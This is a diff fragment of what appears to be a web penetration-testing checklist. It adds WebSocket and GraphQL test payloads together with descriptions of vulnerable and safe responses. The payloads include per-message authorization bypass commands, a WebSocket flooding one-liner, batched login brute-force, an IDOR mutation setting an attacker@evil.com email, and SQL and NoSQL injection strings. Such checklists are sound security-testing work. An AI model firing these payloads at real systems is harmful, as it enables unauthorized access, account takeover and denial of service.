+          safe: "WebSocket message content is validated/sanitized identically to HTTP input, and injected payloads have no effect.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-ws-4",
         text: "Test WebSocket authorization on a per-message basis",
         how: "After connecting, check if every message type re-validates permissions, or if the initial handshake auth is trusted for the whole session regardless of later privilege changes.",
+        payloads: ["wscat -c wss://example.com/socket -x '{\"action\":\"admin.deleteUser\",\"userId\":124}'  # over a low-priv connection"],
+        expectedResponse: {
+          vulnerable: "After a successful handshake, individual messages can perform privileged actions without any per-message authorization check.",
+          safe: "Each WebSocket message is independently authorized against the connected user's permissions.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-ws-5",
         text: "Test WebSocket for IDOR in subscribed channels/rooms",
         how: "Try subscribing to another user's channel/room ID over the socket to access their real-time data stream.",
+        payloads: ["wscat -c wss://example.com/socket -x '{\"action\":\"subscribe\",\"room\":\"user-124-notifications\"}'"],
+        expectedResponse: {
+          vulnerable: "Subscribing to another user's/room's channel ID returns data the requester shouldn't have access to.",
+          safe: "Channel/room subscriptions are authorized against the user's actual membership, and unauthorized IDs are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-ws-6",
         text: "Test WebSocket rate limiting and message size limits",
         how: "Send an excessive volume/size of messages to check for DoS resilience on the WebSocket handler.",
+        payloads: ["python3 -c \"import websocket; ws=websocket.create_connection('wss://example.com/socket'); [ws.send('A'*1000000) for _ in range(1000)]\""],
+        expectedResponse: {
+          vulnerable: "The WebSocket connection accepts unlimited message rate/size, allowing a DoS via flooding or oversized messages.",
+          safe: "The server enforces message rate and size limits on the WebSocket connection, rejecting excessive traffic.",
+        },
         severity: "low",
       },
     ],
@@ -2633,36 +4219,65 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test field-level authorization bypass",
         how: "Query fields/mutations not exposed in the documented schema but discoverable via introspection.",
         payloads: ["{__schema{types{name fields{name}}}}"],
+        expectedResponse: {
+          vulnerable: "A field that should require elevated privileges is returned to a lower-privileged/unauthenticated caller.",
+          safe: "Field-level authorization is enforced per resolver, and unauthorized callers receive null/an error for restricted fields.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-gql-2",
         text: "Test GraphQL for query complexity/depth DoS attack",
         how: "Craft a deeply nested or aliased query to exhaust server resources if no depth/complexity limiting is enforced.",
+        payloads: ["{\"query\":\"{user{friends{friends{friends{friends{friends{id}}}}}}}\"}", "// InQL / graphql-cop for automated batching & depth-limit tests"],
+        expectedResponse: {
+          vulnerable: "A deeply nested or complex query causes excessive server resource consumption or a timeout, confirming a DoS via query complexity/depth.",
+          safe: "The server enforces query depth/complexity limits and rejects overly complex queries before execution.",
+        },
         severity: "medium",
       },
       {
         id: "web-adv-gql-3",
         text: "Test GraphQL batching attack for brute-force bypass",
         how: "Use query/mutation batching in a single request to bypass per-request rate limiting on sensitive operations (e.g. login).",
+        payloads: ["[{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"pass1\\\"){token}}\"},{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"pass2\\\"){token}}\"}]"],
+        expectedResponse: {
+          vulnerable: "A single GraphQL request batching many login/guess mutations bypasses per-request rate limiting, enabling brute-force at scale.",
+          safe: "Rate limiting accounts for batched operations within a single request, or batching is disabled/limited.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-gql-4",
         text: "Test GraphQL for IDOR via node/object identifiers",
         how: "Swap object IDs in queries/mutations to access or modify another user's data through the GraphQL layer.",
+        payloads: ["{\"query\":\"mutation{updateProfile(id:124,email:\\\"attacker@evil.com\\\"){id}}\"}"],
+        expectedResponse: {
+          vulnerable: "Querying another user's node/object ID directly returns their data despite lacking permission.",
+          safe: "Node/object resolvers enforce ownership/authorization checks regardless of the ID supplied.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-gql-5",
         text: "Test GraphQL introspection disabled in production but schema still inferable",
         how: "Even with introspection off, attempt field-suggestion/error-based schema inference to map hidden fields.",
+        payloads: ["{\"query\":\"{user{ema}}\"}  # trigger 'Did you mean \\\"email\\\"?' suggestion error", "clairvoyance -o schema.json https://example.com/graphql"],
+        expectedResponse: {
+          vulnerable: "Even with introspection disabled, the schema can still be reconstructed via field-suggestion errors or known query brute-forcing.",
+          safe: "Error messages give no field-suggestion hints and the schema cannot be practically reconstructed without introspection.",
+        },
         severity: "low",
       },
       {
         id: "web-adv-gql-6",
         text: "Test GraphQL for injection through resolver arguments",
         how: "Fuzz string arguments passed into resolvers for SQLi/NoSQLi if resolvers build queries dynamically from input.",
+        payloads: ["{\"query\":\"{user(name:\\\"' OR 1=1-- -\\\"){id,email}}\"}", "{\"query\":\"{user(name:\\\"admin\\\"){id}}\",\"variables\":{\"filter\":{\"$where\":\"sleep(3000)\"}}}"],
+        expectedResponse: {
+          vulnerable: "A resolver argument is passed unsanitized into a downstream query/command, resulting in injection (SQLi, NoSQLi, command injection).",
+          safe: "Resolver arguments are validated/parameterized before use in any downstream query or command.",
+        },
         severity: "critical",
       },
     ],
